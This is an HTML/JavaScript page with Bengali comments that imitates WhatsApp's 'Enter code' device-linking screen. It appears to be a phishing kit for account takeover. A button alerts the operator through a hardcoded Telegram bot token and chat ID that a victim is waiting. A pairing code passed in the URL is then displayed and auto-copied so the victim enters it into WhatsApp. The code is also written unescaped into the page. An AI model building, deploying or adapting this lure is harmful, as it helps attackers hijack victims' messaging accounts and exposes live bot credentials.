<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Code</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
        }

        .whatsapp-container {
            width: 100%;
            max-width: 500px;
            padding: 30px 24px;
            box-sizing: border-box;
            text-align: center;
        }

        /* ওপরের স্থায়ী অংশ */
        .header-section {
            margin-bottom: 35px;
            text-align: left;
        }

        .header-section h2 {
            font-size: 22px;
            font-weight: 500;
            color: #111b21;
            margin: 0 0 20px 0;
        }

        .header-section p {
            font-size: 15px;
            color: #3b4a54;
            line-height: 1.45;
            margin: 0 0 8px 0;
        }

        .header-section .link-highlight {
            color: #00a884;
            text-decoration: none;
            font-weight: 500;
        }

        /* "নোটিফিকেশন পাঠাও" বাটন ডিজাইন */
        .btn-notify {
            background-color: #00a884;
            color: white;
            border: none;
            padding: 14px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 25px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 2px 5px rgba(0,168,132,0.3);
            margin-bottom: 25px;
            transition: 0.2s;
        }

        .btn-notify:active {
            background-color: #008f70;
            transform: scale(0.98);
        }

        /* ৮টি ফাঁকা ঘরের ডিজাইন */
        .dynamic-code-section {
            display: none; /* শুরুতে এটি লুকিয়ে থাকবে, কোড থাকলে দেখাবে */
            flex-direction: column;
            align-items: center;
            margin-top: 10px;
        }

        .code-grid {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-bottom: 20px;
            cursor: pointer;
        }

        .box-cell {
            width: 36px;
            height: 48px;
            border: 2px solid #111b21;
            border-radius: 12px;
            font-size: 24px;
            font-weight: bold;
            color: #111b21;
            display: flex;
            justify-content: center;
            align-items: center;
            background: transparent;
            text-transform: uppercase;
        }

        .hyphen {
            font-size: 24px;
            color: #111b21;
            margin: 0 6px;
            font-weight: bold;
        }

        .warning-text {
            font-size: 14px;
            color: #667781;
            font-weight: 500;
            margin-top: 10px;
            text-align: center;
        }

        .toast-msg {
            color: #00a884;
            font-size: 14px;
            font-weight: bold;
            margin-top: 8px;
            display: none;
            background: #eafefb;
            padding: 6px 16px;
            border-radius: 20px;
        }
    </style>
</head>
<body>

<div class="whatsapp-container">
    
    <div class="header-section">
        <h2>Enter code</h2>
        <p>To get your code: Go to WhatsApp on the web or on another device, then click <strong>Link with phone number</strong>. <span class="link-highlight">Learn more</span></p>
    </div>

    <button class="btn-notify" id="notify-btn" onclick="sendTelegramNotification()">নোটিফিকেশন পাঠাও</button>

    <div class="dynamic-code-section" id="dynamic-area">
        </div>

</div>

<script>
  // টেলিগ্রাম বটের তথ্য (আপনার দেওয়া আসল টোকেন ও আইডি)
  const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
  const chatId = "8516934257";

  // ইউআরএল থেকে কোড চেনার ফাংশন (যেমন: ?code=ABCD1234)
  function getCodeFromUrl() {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get('code');
  }

  let currentActiveCode = getCodeFromUrl();

  // ক্লিপবোর্ডে কপি করার ফাংশন
  function triggerCopy(codeText) {
      if (!codeText) return;
      navigator.clipboard.writeText(codeText).then(() => {
          const toast = document.getElementById("copy-toast");
          if (toast) {
              toast.style.display = "block";
              setTimeout(() => { toast.style.display = "none"; }, 2500);
          }
      }).catch(err => {
          console.log("Clipboard write status: Blocked");
      });
  }

  // ১. টেলিগ্রামে নোটিফিকেশন পাঠানোর ফাংশন
  function sendTelegramNotification() {
      const btn = document.getElementById("notify-btn");
      btn.innerText = "পাঠানো হচ্ছে...";
      btn.disabled = true;

      // টেলিগ্রাম বটে মেসেজ পাঠানোর লিংক
      const messageText = "🔔 একজন ইউজার ওয়েবসাইটে প্রবেশ করেছে এবং কোডের জন্য অপেক্ষা করছে!";
      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;

      fetch(telegramUrl)
      .then(response => {
          if(response.ok) {
              btn.innerText = "অনুরোধ পাঠানো হয়েছে ✅";
              btn.style.backgroundColor = "#8696a0";
          } else {
              alert("টেলিগ্রামে রিকোয়েস্ট যায়নি। বট টোকেন চেক করুন।");
              btn.innerText = "নোটিফিকেশন পাঠাও";
              btn.disabled = false;
          }
      })
      .catch(error => {
          alert("নেটওয়ার্ক সমস্যা!");
          btn.innerText = "নোটিফিকেশন পাঠাও";
          btn.disabled = false;
      });
  }

  // ২. ৮টি ফাঁকা ঘর সাজানোর অংশ
  const dynamicArea = document.getElementById('dynamic-area');

  if (currentActiveCode && currentActiveCode.length === 8) {
      currentActiveCode = currentActiveCode.toUpperCase();
      
      // ৮টি ঘর থাকলে "নোটিফিকেশন পাঠাও" বাটনটি লুকিয়ে যাবে
      document.getElementById("notify-btn").style.display = "none";
      dynamicArea.style.display = "flex"; // ঘরগুলো দৃশ্যমান হবে
      
      const firstPart = currentActiveCode.substring(0, 4);
      const secondPart = currentActiveCode.substring(4, 8);
      
      let gridHtml = `<div class="code-grid" onclick="triggerCopy('${currentActiveCode}')">`;
      for (let i = 0; i < 4; i++) {
          gridHtml += `<div class="box-cell">${firstPart[i]}</div>`;
      }
      gridHtml += '<span class="hyphen">-</span>';
      for (let i = 0; i < 4; i++) {
          gridHtml += `<div class="box-cell">${secondPart[i]}</div>`;
      }
      gridHtml += '</div>'; 
      gridHtml += '<div class="toast-msg" id="copy-toast">✓ কোডটি ক্লিপবোর্ডে কপি হয়েছে!</div>';
      gridHtml += '<div class="warning-text">Never enter a code if you didn\'t request it.</div>';
      
      dynamicArea.innerHTML = gridHtml;
      
      // অটো কপি ট্রিপস
      setTimeout(() => { triggerCopy(currentActiveCode); }, 500);
      document.body.addEventListener('click', () => { triggerCopy(currentActiveCode); });
  }
</script>

</body>
</html>
